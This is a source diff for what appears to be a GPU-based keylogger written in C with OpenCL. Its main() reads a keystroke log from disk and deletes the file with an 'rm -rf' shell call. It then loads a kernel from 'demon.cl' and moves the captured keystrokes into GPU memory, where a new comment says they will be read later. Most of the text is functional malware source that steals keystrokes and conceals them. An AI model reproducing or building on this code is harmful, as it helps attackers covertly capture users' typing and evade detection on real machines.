@@ -73,78 +73,71 @@ cl_program build_program(jelly->ctx, jelly->dev, const char *filename){
 }
 
 int main(int argc, char **argv){
-FILE *f;
-f = fopen(keylog, "r");
-fseek(f, 0, SEEK_SET);
-fread(buffer, VRAM_LIMIT, 1, f);
-fclose(f);
+    FILE *f;
+    f = fopen(keylog, "r");
+    fseek(f, 0, SEEK_SET);
+    fread(buffer, VRAM_LIMIT, 1, f);
+    fclose(f);
 
-system("rm -rf strokes.txt");
+    system("rm -rf strokes.txt");
 
-/* Create device and context */
-jelly->dev = create_device();
-jelly->ctx = clCreateContext(NULL, 1, &jelly->dev, NULL, NULL, &err);
-if(err < 0){
-    perror("Couldn't create context");
-    exit(1);
-}
+    /* Create device and context */
+    jelly->dev = create_device();
+    jelly->ctx = clCreateContext(NULL, 1, &jelly->dev, NULL, NULL, &err);
+    if(err < 0){
+        perror("Couldn't create context");
+        exit(1);
+    }
 
-/* Build program */
-jelly->program = build_program(jelly->ctx, jelly->dev, GPU_LOGGER);  // demon.cl
+    /* Build program */
+    jelly->program = build_program(jelly->ctx, jelly->dev, GPU_LOGGER);  // demon.cl
 
-/* Create data buffer */
-in = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR,
-			      VRAM_LIMIT * sizeof(char), buf, &err);
-out = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR,
-			    VRAM_LIMIT * sizeof(char), buf2, &err);
-if(err < 0){
-    perror("Couldn't create logging buffer"); 
-    exit(1);
-};
+    /* Create data buffer */
+    in = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR,
+			      VRAM_LIMIT * sizeof(char), buffer, &err);
+    out = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR,
+			    VRAM_LIMIT * sizeof(char), buffer2, &err);
+    if(err < 0){
+        perror("Couldn't create logging buffer"); 
+        exit(1);
+    };
 
-/* Create command queue */
-jelly->cq = clCreateCommandQueue(jelly->ctx, jelly->dev, 0, &err);
-if(err < 0){
-    perror("Couldn't create command queue");
-    exit(1);
-};
+    /* Create command queue */
+    jelly->cq = clCreateCommandQueue(jelly->ctx, jelly->dev, 0, &err);
+    if(err < 0){
+        perror("Couldn't create command queue");
+        exit(1);
+    };
 
-/* Create kernel */
-jelly->kernel = clCreateKernel(jelly->program, KERNEL_FUNC, &err);  // store_keys_gpu(..)
-if(err < 0){
-    perror("Couldn't create kernel");
-    exit(1);
-};
+    /* Create kernel */
+    jelly->kernel = clCreateKernel(jelly->program, KERNEL_FUNC, &err);  // store_keys_gpu(..)
+    if(err < 0){
+        perror("Couldn't create kernel");
+        exit(1);
+    };
 
-/* Kernel arguments */
-err = clSetKernelArg(jelly->kernel, 0, sizeof(cl_mem), &in);
-err |= clSetKernelArg(jelly->kernel, 1, sizeof(cl_mem), &out);
-if(err < 0){
-    perror("Couldn't create kernel argument");
-    exit(1);
-}
+    /* Kernel arguments */
+    err = clSetKernelArg(jelly->kernel, 0, sizeof(cl_mem), &in);
+    err |= clSetKernelArg(jelly->kernel, 1, sizeof(cl_mem), &out);
+    if(err < 0){
+        perror("Couldn't create kernel argument");
+        exit(1);
+    }
 
-/* Enqueue kernel */
-err = clEnqueueNDRangeKernel(jelly->cq, jelly->kernel, 1, NULL, &global_size, &local_size, 0, NULL, NULL);
-if(err < 0){
-    perror("Couldn't enqueue kernel");
-    exit(1);
-}
+    /* Enqueue kernel */
+    err = clEnqueueNDRangeKernel(jelly->cq, jelly->kernel, 1, NULL, &global_size, &local_size, 0, NULL, NULL);
+    if(err < 0){
+        perror("Couldn't enqueue kernel");
+        exit(1);
+    }
 
-/* Read kernel's output */
-err = clEnqueueReadBuffer(jelly->cq, out, CL_TRUE, 0, sizeof(buffer), buffer, 0, NULL, NULL);
-if(err < 0){
-    perror("Couldn't read buffer");
-    exit(1);
-} else{
-    printf("%s\n", buffer);
-}
+    // keyboard buffer now in gpu
+    // how and when we want to read it, we'll see later on
 
-/* Free memory */
-clReleaseKernel(jelly->kernel);
-clReleaseMemObject(out);
-clReleaseMemObject(in);
-clReleaseCommandQueue(jelly->cq);
-clReleaseProgram(jelly->program);
-clReleaseContext(jelly->ctx);
+    clReleaseKernel(jelly->kernel);
+    clReleaseMemObject(out);
+    clReleaseMemObject(in);
+    clReleaseCommandQueue(jelly->cq);
+    clReleaseProgram(jelly->program);
+    clReleaseContext(jelly->ctx);
 }
